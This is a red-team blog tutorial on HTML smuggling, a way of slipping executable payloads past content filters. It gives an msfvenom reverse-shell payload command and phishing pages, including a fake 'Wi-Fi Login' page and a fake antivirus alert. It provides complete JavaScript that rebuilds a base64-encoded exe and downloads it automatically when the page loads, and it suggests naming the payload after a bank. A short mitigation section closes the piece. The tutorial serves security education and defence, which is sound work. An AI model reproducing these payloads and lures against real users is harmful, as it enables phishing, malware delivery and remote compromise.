@@ -1,0 +1,195 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/red-teaming/" rel="category tag">Red Teaming</a></span>            </div>
+            <h1 class="post-title entry-title">A Detailed Guide on HTML Smuggling</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/a-detailed-guide-on-html-smuggling/" rel="bookmark"><time class="entry-date published" datetime="2022-04-19T18:03:28+00:00">April 19, 2022</time><time class="updated" datetime="2025-06-19T13:23:36+00:00">June 19, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000">HTML Smuggling is an evasive payload delivery method that helps an attacker smuggle payload past content filters and firewalls by hiding malicious payloads inside of seemingly benign HTML files. This is possible by using JavaScript blobs and the HTML5 download attribute used with the anchor tag. This article demonstrates the methodology and two such readily available scripts that perform HTML smuggling.</span></p>
+<ol>
+<li><span style="color: #000000"><strong>MITRE TACTIC: Defense Evasion (TA0005)</strong></span></li>
+<li><span style="color: #000000"><strong>MITRE Technique ID: Obfuscated Files or Information (T1027)</strong></span></li>
+<li><span style="color: #000000"><strong>MITRE SUB ID: HTML Smuggling (T1027.006)</strong></span></li>
+</ol>
+<h3><span style="color: #800000">Table of content</span></h3>
+<ul>
+<li><span style="color: #000000"><strong>Anchor tags, JavaScript Blobs</strong></span></li>
+<li><span style="color: #000000"><strong>HTML Smuggling Attack</strong></span></li>
+<li><span style="color: #000000"><strong>Demonstration using Python Script</strong></span></li>
+<li><span style="color: #000000"><strong>Smuggling Template</strong></span></li>
+<li><span style="color: #000000"><strong>Mitigation</strong></span></li>
+<li><span style="color: #000000"><strong>Conclusion</strong></span></li>
+</ul>
+<h3><span style="color: #800000">Anchor tags, JavaScript Blobs</span></h3>
+<h5><span style="color: #000000"><strong>Anchor: </strong></span></h5>
+<p><span style="color: #000000">The anchor tag &lt;a&gt; defines a hyperlink that can be used to link one page to another resource like the script, other HTML page or downloadable files.</span></p>
+<p><span style="color: #000000">When &lt;a&gt; is used with the “download” attribute, it can be used to provide links to a downloadable file.</span></p>
+<h5><span style="color: #000000"><strong>JavaScript Blob: </strong></span></h5>
+<p><span style="color: #000000">JavaScript blobs are objects that are a collection of bytes that contain data stored in a file. The user’s memory stores Blob data. You can use this collection of bytes in the same places where an actual file would be used. In other words, you can use blobs to construct file-like objects on the client that JavaScript APIs expecting URLs can receive.</span></p>
+<p><span style="color: #000000">For example, a file “payload.exe” hosted on a server is downloaded in the system using &lt;a download&gt; tag and in the same way, the bytes of the file payload.exe can be provided as input in JS code as a JS blob, it can be compiled and downloaded at the user end. You can use Slice() to divide a large payload and supply it in the code.</span></p>
+<p><span style="color: #000000">In another example, a developer can use a string “IgniteTechnologies,” which is also a collection of ASCII bytes, with JS blobs. A good example code of JS Blob can be found <span style="color: #0000ff"><strong><a style="color: #0000ff" href="https://www.tutorialspoint.com/javascript/javascript_blob.htm">here</a></strong></span>.</span></p>
+<p><span style="color: #000000">Here, buffer is an array of bytes of the file and the second option we provide is the type of the blob. Here, it is text but, in the demonstration, ahead we’ll use the one suitable for an exe file.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">var abc = new Blob(buffer, MIME type of buffer);
+var abc = new Blob([“IgniteTechnologies”], {type : "text/plain"});</pre>
+<p><span style="color: #000000">And then you can use the blob to display output, drop the file on the victim, or perform some other function.</span></p>
+<h3><span style="color: #800000">HTML Smuggling Attack</span></h3>
+<p><span style="color: #000000">Let’s start with the basics. In HTML5, if we want a user to download a file hosted on our server, we can do that by using the anchor tag.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">&lt;a href=”/payload.exe” download=”payload.exe”&gt;Download Here&lt;/a&gt;</pre>
+<h5><strong><span style="color: #000000">Creating the Payload and Hosting It</span></strong></h5>
+<p><span style="color: #000000">For that, let’s first create a payload using msfvenom and copy it in our apache webroot directory.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.0.89 LPORT=1234 -f exe &gt; payload.exe
+cp payload.exe /var/www/html</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEijyGpSgrbOz6nwy5dTzSsmsxx9hjx-CnllIom3oO0KfdDCkKStaiIWULt4B8AYz6DbPqjTYr1-MdgDcjhtX_pY7L7iA6FKbnU2_OmmcU1t6zNLr1zoqxa1t6-8kgSm-sQ_n549RGBqdqtMonWflrU4lTekEEPvZx88mrgKqrtbpAFWwXwJ4JLRhcR9rQ/s16000/1.png"/></span></p>
+<h5 data-start="671" data-end="700"><strong><span style="color: #000000">Designing a Phishing Page</span></strong></h5>
+<p data-start="702" data-end="786"><span style="color: #000000">Next, we create a phishing page that tricks the victim into downloading the payload:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">&lt;html&gt;
+&lt;body&gt;
+&lt;h1&gt;Wi-Fi Login Page!&lt;/h1&gt;
+&lt;p&gt;Alert! We detected some unusual activity, Login to continue. &lt;/p&gt;
+&lt;a href="/payload.exe" download="payload.exe"&gt;Login Here&lt;/a&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre>
+<h5 data-start="1032" data-end="1062"><strong><span style="color: #000000">Deploying the Phishing Page</span></strong></h5>
+<p data-start="1064" data-end="1133"><span style="color: #000000">Then we copy this into the apache webroot and start the apache server</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cp index.html /var/www/html
+cd /var/www/html
+service apache2 start</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgvNceVhzP12PADEBOh314aqWx3t8kqW9QSdd00GuZ5_fxw2Zyy-IerKoBUR7UySjXg7UrQQUMXX24DijhNS7kMyIWtg9yYeVfEi6d366i3DV6sh3phtcFNd_LwqY91fKLPn4cjzrlEcp02KeQblBtID7FHnas6_ZcKxZe1gF8UnIemW8_aZbd0cLr12g/s16000/2.png"/></span></p>
+<h5><strong><span style="color: #000000">Delivering the Payload</span></strong></h5>
+<p><span style="color: #000000">Once the victim accesses our website and clicks download, the payload shall be delivered.</span></p>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgMaLqHydNiPQ0GhC0ElEULpxGeBr5PoMOd1EH8YGZzy8ZCLWRUPeoyN8VjWFsfrg71vS-P8kndAf6919Q3tg_pANX6SaiLI03FXoAJ5yDOAByeXfQcZatqGTUZxewddmmg07ftmCge05hjAnvfCSgIsuR9YRFywgb4jiPnNmEPUXSpTJ3ECFk2GSjlfA/s16000/3.png"/></span></p>
+<p><span style="color: #000000">When it will be run, we’ll see a reverse shell back. But that’s quite basic. What if using JavaScript we’re able to make a user download a file as soon as the website is accessed. This is where we’ll utilize JS Blobs.</span></p>
+<h5><strong><span style="color: #000000">Preparing the Base64 Payload</span></strong></h5>
+<p><span style="color: #000000">First, we need to create a payload, let’s call it payload.exe. Then we need to encode this in Base64 because various characters in the binary can break the buffer, preventing a full file from being copied directly.</span></p>
+<p><span style="color: #000000">This can be done using the base64 utility in Kali Linux.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat payload.exe | base64</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhmHqCdCVuQc2UEluwMspDjGHY2405IauFSShKhqn-AiqO82zGj3FfLvCvAoOOj9DbgYmxs5AyJWXncuvCF_5RImJkUQwtDczPLUDcpqE_JVlfwU7ks4ns9IZz57txUU0CaPJG6Czo3vVc3TTHF5VXW6jWYCF-vm8Ac4K4Xk5dRDWa9E70BAHZjNCrBWw/s16000/4.png"/></span></p>
+<h5><strong><span style="color: #000000">Fixing the Base64 Formatting</span></strong></h5>
+<p><span style="color: #000000">But this base64 encoded binary still has problems. If you see the output given isn’t a single line output and rather contains “enters”</span></p>
+<p><span style="color: #000000">But in order to supply this into our blob as a buffer, we need a single string with no enters. This fixing be done manually by copying this output in notepad and removing enters or you could follow our alternate approach by going to base64.guru website.</span></p>
+<p><span style="color: #000000">Here, upload your payload and the converted base64 shall be given in a single line.</span></p>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiXi6fUyEl02In2oLH7zrGb9wDgmUKUjURNer6QCCLo5bHwN16KgFpZRufl9yDm6F8rTk3k8S2ZNUiWbtLbYxQgnN-RF-oyAcGIit9Lq0qSCyXZrMcguJ7qoVewehXim002XlKHUDTh_JIMfGuYwO7dg3Q2QuHAsIKzP0y8-NNPwt8_lFh1sXhzxZ-O8Q/s16000/5.png"/></span></p>
+<h5><span style="color: #000000">Building the JavaScript Blob Auto-Download</span></h5>
+<p><span style="color: #000000">Now comes the code. We will now create a JavaScript Blob and a script that will allow us as an attacker to make our code recompile as an EXE file at the victim end. This approach can bypass many content filters and firewalls since the data is travelling as a string text.</span></p>
+<p><span style="color: #000000">The code’s explanation is as follows:</span></p>
+<ul>
+<li><span style="color: #000000"><strong>Function b64toarray</strong>: Takes input of our base64 encoded binary file and converts it into a buffer array. This is necessary as the “Blog()” function takes input from a buffer array as the first parameter.</span></li>
+<li><span style="color: #000000"><strong>Variable binary: </strong>This variable holds the base64 string of our binary and provides function b64toarray input.</span></li>
+<li><span style="color: #000000"><strong>Variable blob: </strong>Holds the blob we just created and takes two inputs as explained above. Here, since we are providing a binary as input the MIME type becomes octet/stream</span></li>
+<li><span style="color: #000000"><strong>Variable payloadfilename:</strong> We will give this name to our binary once it is downloaded on the victim’s machine.</span></li>
+<li><span style="color: #000000"><strong>CreateElement</strong>: A DOM function that can create new HTML elements with the help of JavaScript. For example to create a new para in HTML we type: &lt;p&gt;New Para&lt;/p&gt;</span></li>
+</ul>
+<p><span style="color: #000000">Same can be implemented in JS using createElement like:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">var para = document.createElement("p");
+para.innerText = "New Para";</pre>
+<h5>Constructing the Auto-Download Anchor</h5>
+<p><span style="color: #000000">Here, we created an anchor tag and used the appendChild() function to insert data inside this newly created element. For example,</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">&lt;a href=”/” download=”/”&gt;</pre>
+<p><span style="color: #000000">In this example, href and download are child tags of a. So in JS this will be:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">var a = document.createElement('a');
+document.body.appendChild(a);
+a.href = ‘/’;
+a.download = ‘/’;</pre>
+<ul>
+<li><span style="color: #000000"><strong>style: </strong>We are using the styling ‘display: none’ to be more discreet so that a tag isn’t visible on the output.</span></li>
+<li><span style="color: #000000"><strong>createObjectURL(): </strong>A DOM function that can return a DOMString containing a value that represents the URL of an object. This object can be a file, media source or in our case blob. It is very necessary as the a.download works on valid URLs only. To download our payload blob on the victim, we must supply the a.download element with a valid URL that this function returns.</span></li>
+<li><span style="color: #000000"><strong>click(): </strong>Is what will trigger this anchor tag to automatically run. It simulates as if a user has actually clicked on the link provided by the href tag.</span></li>
+</ul>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjn7oz0UCBMvgt_zOD0p427E30TJDvuG9egg90ybR_fVC1OWahQ7N0WGTc4cU14oAk0VKJtTEyF_T_UiMNnwSm0yQTdtHp4EY9yd-CkKVkvwYeCv64Wxv6m83d3bXqUnSdTpValTAmZW8F5vTzsJP3wck4R-HgoLtbzUiIo7rfApKpmQSkGeC35UsMXaw/s16000/6.png"/></span></p>
+<h5><strong><span style="color: #000000">Final HTML Page with JavaScript Payload Delivery</span></strong></h5>
+<p><span style="color: #000000">Then, when we run the website, we’ll see that it has automatically downloaded the payload.</span></p>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiVTduqKpaUGDly2EiLEeHyAR2zuB8CFbKCeRpJtiW6nrUf_WpD0yqf3JvUO4PLwQArEsQ1L7C-eFo_YpgvQPTtiaoSdvuohDYu_8fX0KUH9yIcd_NSMOcpqkZSFX6eY0p74IDEA4d3iFOfKHwowhI5hiBmEjzjUynjUcEMJtX_nhACum9a52M_UX9VdA/s16000/7.png"/></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">&lt;html&gt;
+&lt;body&gt;
+&lt;h1&gt;Malware Detected!&lt;/h1&gt;
+&lt;p&gt;Alert! Run the downloaded script for anti-virus scan!&lt;/p&gt;
+&lt;script&gt;
+function b64toarray(base64) {
+        var bin_string = window.atob(base64);
+        var len = bin_string.length;  
+        var bytes = new Uint8Array( len );
+        for (var i = 0; i &lt; len; i++)
+        {
+                bytes[i] = bin_string.charCodeAt(i);
+        }
+        return bytes.buffer;
+}
+var binary ='&lt;value&gt;'
+
+var data = b64toarray(binary);
+var blob = new Blob([data], {type: 'octet/stream'});
+var payloadfilename = 'payload.exe';
+
+var a = document.createElement('a');
+document.body.appendChild(a);
+a.style = 'display: none'; 
+var url = window.URL.createObjectURL(blob);
+a.href = url;
+a.download = payloadfilename;
+a.click();
+window.URL.revokeObjectURL(url);
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre>
+<p><span style="color: #000000">When this file will be run by our victim, we’ll get a reverse shell!</span></p>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgxL96eGTy0Y1mwkut5eICPimc1j7eHTvcaCT6MpBSu6gn54SzxPQehoeiIXY8QZR_27k_rGQcFBGhHtIffmWEUnW9dNf4pBZsynhgBLSYlKz-mN7ubofhIX0khBP2XZGKnF0lj-hAG8JrKP3wBOhyf6vlgQ8bc622hWBZyDan8KWM2ghEakTl3ZeTlAA/s16000/8.png"/></span></p>
+<p><span style="color: #000000">Now, you can be crafty while doing this yourself. Outflank has performed the same attack using a Microsoft document. E-mail phishing campaigns can send this to lure the victim to run the malicious file.</span></p>
+<p><span style="color: #000000">You can check the demo <span style="color: #0000ff"><strong><a style="color: #0000ff" href="https://www.outflank.nl/demo/html_smuggling.html">here</a></strong></span>. Make sure to view the source code!</span></p>
+<h3><span style="color: #800000">Demonstration using Python Script</span></h3>
+<p><span style="color: #000000">We can replicate what we did with code just now using automated scripts too. Automating this process is fairly simple. Unknow101 wrote a Python script that takes in a random key to encrypt the payload string, the filename (path) of the payload, the template of the phishing page or HTML file to use (POC given in his source code called smug.html), the output filename (here payload.exe again), and the destination to store the resulting HTML smuggling phishing page.</span></p>
+<p><span style="color: #000000">We can clone the github repo and run this using python2 like so:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">git clone https://github.com/Unknow101/FuckThatSmuggler.git
+cd FuckThatSmuggler
+python2 fuckThatSmuggler.py -k 123 -f ~/payload.exe -t ./templates/smug.html -fn ~/payload.exe -o /var/www/html/index.html</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjrtPbh159ihj15tMwHJ8grYAcZJAIeSDOKt47afeM6e3PRra-amZ2VAwKfPBeLVnf5ORmog8eC4tjfT0Ti3rgs7HE6FhTDhai0O3lCYp4tq3MYh3S22XUXQL0yHRawryqpv8fVTYFNbm5e1CUbTePhpuNlY591hNjEwGg8F91nUYaa-Ycp0yB3fpOc9w/s16000/9.png"/></span></p>
+<p><span style="color: #000000">Then, we have replaced the index.html file in our apache webroot. Lets see what happens when the victim accesses our website.</span></p>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEibSDuaIcBbHTZKjAJkME2_bArxJauBTJ-eMRYfSkYwbHEt73WQmBlUjhkcN8BLU7OdMGEGL-PGwHQRFLwPcAVFgHKrkZFZbJTjRrhEnX__oBh9gVL6V6Bf6jI84hA3fjhfGPRkjutpLfvXEIAqDr3RzZ0ud6O3jV0nqJVKCszH61kXyYMTHyaJQU1DAQ/s16000/10.png"/></span></p>
+<p><span style="color: #000000">As expected, it drops a payload on the victim’s system that we can now execute to give us a reverse shell.</span></p>
+<h3><span style="color: #800000">Smuggling Template</span></h3>
+<p><span style="color: #000000">Many HTML templates that demonstrate HTML smuggling fill the Internet. We can download any one of them and modify the binary string and name of the payload and we’re good to go! No need to code. One such template can be found <span style="color: #0000ff"><strong><a style="color: #0000ff" href="https://gist.github.com/JamesCooteUK/507e5cc924e7811fbada64102d35509a">here</a></strong></span>.</span></p>
+<p><span style="color: #000000">To download this as index.html</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">wget https://gist.githubusercontent.com/JamesCooteUK/507e5cc924e7811fbada64102d35509a/raw/46d163491eceb216ab8c110eb474d4113072e5e8/html-smuggling-example.html
+cp html-smugling-example.html /var/www/html/index.html</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhiV1gP7PJ15UKhangCvo8_SfFfo9NE_gxc9xMocqvhXAB4bvBr2E5LZEJv2TSqLQ0ne7nl-mc6yTcB-xgMFSMRDCed6J-uEDRhACH11ZHGtkDsB_BIYoEYR2pJk07NXI7qBHtDazgUpXICSKFrQC4HNua0xcazaKpGdFP-QKu3eWdNsy4YU4Gsy_qOvQ/s16000/11.png"/></span></p>
+<p><span style="color: #000000">Then, we can replace the binary with our previously generated base64 string and keep the payload name to whatever we like, let’s say HSBCInternetBanking.exe</span></p>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhFeVsrGZbHooGrllf0w1rXzneNu2BTM_srOHWIWkqAlup6DX2FCFO-spaLnpgiSy9wI63d6cEDJsLUhSDkoIYOAS50xq0ElZEy5PmrfHxKLL0PcCP_hUFta6XGdGpntG0KF8bjzP3v89VRpqOru3vSTa5IRCHI23vAMdV-svF6xuj-jbakAGv7UK7j1g/s16000/12.png"/></span></p>
+<p><span style="color: #000000">Once saved, the victim will now access the webpage and see the system drop the payload.</span></p>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgyGuX4i6h0X7MYhNbLG05OhVwu9GwCfeOZg3ASvaOGPg60amviJ9XW_0kkiou-rBgqdVfaNv7YjaHFI8HsZDS5I2J9J2vYbh2BmH8z3RcVwD-0Es8mABgwPLqqv8ISMuQxexqpe87FusSivpB1sPhKUPL7uvB18YIeflee_1pPTj8zLuUKaarpGWnnmQ/s16000/13.png"/></span></p>
+<p><span style="color: #000000">Once executed, we’ll get a reverse shell!</span></p>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhcMm_QcP4ev4iEeDm0GZ-e6t6giHvaLoWVrCZKcZ_EITHyl8eXXZk5LYAxvszydqjezuFk__j6HHgPiFKfl5s24yV3NLRnD_bAZ1mp2TsPnZC6FAgul-3vhljCjKF8ab-wdgJEUx850_PQrktO_UUq1tmjXnT4X7D_hH-a-i65L8RthpqPf2uIMjy4sA/s16000/14.png"/></span></p>
+<p><span style="color: #000000"><strong>NOTE: </strong>HTML smuggling code can be sneaked into any legit phishing page in order to increase its chances of getting executed by the user. You may also use advanced methods like MS Office documents with malicious macros, shortcut files or maybe malicious pdfs.</span></p>
+<h3><span style="color: #800000">Mitigation</span></h3>
+<p><span style="color: #000000">Following are recommended to protect against HTML Smuggling attacks:</span></p>
+<ul>
+<li><span style="color: #000000">Configure security products to block against pages using JS or VBScript from automatically running a downloaded executable</span></li>
+<li><span style="color: #000000">Whitelist executable filenames</span></li>
+<li><span style="color: #000000">Set .js and .jse to open with notepad by default and not a browser</span></li>
+<li><span style="color: #000000">Aware users must manually review e-mail attachments</span></li>
+<li><span style="color: #000000">Set behaviour rules for HTML pages that decode base64 code or obfuscate a JS script.</span></li>
+</ul>
+<p><span style="color: #000000">Other Microsoft recommendations can be found <span style="color: #0000ff"><strong><a style="color: #0000ff" href="https://www.microsoft.com/security/blog/2021/11/11/html-smuggling-surges-highly-evasive-loader-technique-increasingly-used-in-banking-malware-targeted-attacks/">here</a></strong></span>.</span></p>
+<h3><span style="color: #800000">Conclusion</span></h3>
+<p><span style="color: #000000">The article discussed a defense evasion method known as HTML smuggling, which stealthily drops a payload on the victim’s system as soon as they load the website. This technique is effective because it uses JavaScript blobs that allow the payload to embed as a buffer string—often encoded—within the HTML page. Rather than saving the file on disk initially, the code keeps the payload in memory, where it later decodes and downloads as an executable on the victim’s system. As a result, this method can bypass multiple content filters within an organization’s security architecture. For instance, it can evade filters that block EXE attachments from emails but still permit JavaScript execution without triggering behavioral detection mechanisms. In conclusion, HTML smuggling is a clever and dangerous technique that defenders should be aware of. Hope you enjoyed the article, and thanks for reading!</span></p>
+<p><span style="color: #000000"><strong>Author: Harshit Rajpal </strong>is an InfoSec researcher and left and right brain thinker. Contact</span><strong> <span style="color: #0000ff"><a class="broken_link" style="color: #0000ff" href="https://in.linkedin.com/in/harshit-rajpal-79bb43103">here</a></span></strong></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
+<!-- YARPP Thumbnails -->
+<h3>Related posts:</h3>
+<div class="yarpp-thumbnails-horizontal">
+<a class="yarpp-thumbnail" rel="norewrite" href="https://www.hackingarticles.in/a-detailed-guide-on-kerbrute/" title="A Detailed Guide on Kerbrute">
+<span class="yarpp-thumbnail-default"><img src="https://www.hackingarticles.in/wp-content/plugins/yet-another-related-posts-plugin/images/default.png" alt="Default Thumbnail" data-pin-nopin="true"/></span><span class="yarpp-thumbnail-title">A Detailed Guide on Kerbrute</span></a>
+<a class="yarpp-thumbnail" rel="norewrite" href="https://www.hackingarticles.in/a-detailed-guide-on-evil-winrm/" title="A Detailed Guide on Evil-Winrm">
+<span class="yarpp-thumbnail-default"><img src="https://www.hackingarticles.in/wp-content/plugins/yet-another-related-posts-plugin/images/default.png" alt="Default Thumbnail" data-pin-nopin="true"/></span><span class="yarpp-thumbnail-title">A Detailed Guide on Evil-Winrm</span></a>
+</div>
+</div>
+            </div><!-- .entry-content -->
+            <footer class="post-footer entry-footer">
+                                                
+            </footer><!-- .entry-footer -->
+            
+	<nav class="navigation post-navigation" aria-label="Posts">
+		<h2 class="screen-reader-text">Post navigation</h2>
+		<div class="nav-links"><div class="nav-previous"><a href="https://www.hackingarticles.in/medusa-brute-force-tool-guide/" rel="prev">A Detailed Guide on Medusa</a></div><div class="nav-next"><a href="https://www.hackingarticles.in/hydra-brute-force-tool-guide/" rel="next">A Detailed Guide on Hydra</a></div></div>
+	</nav>        </div>
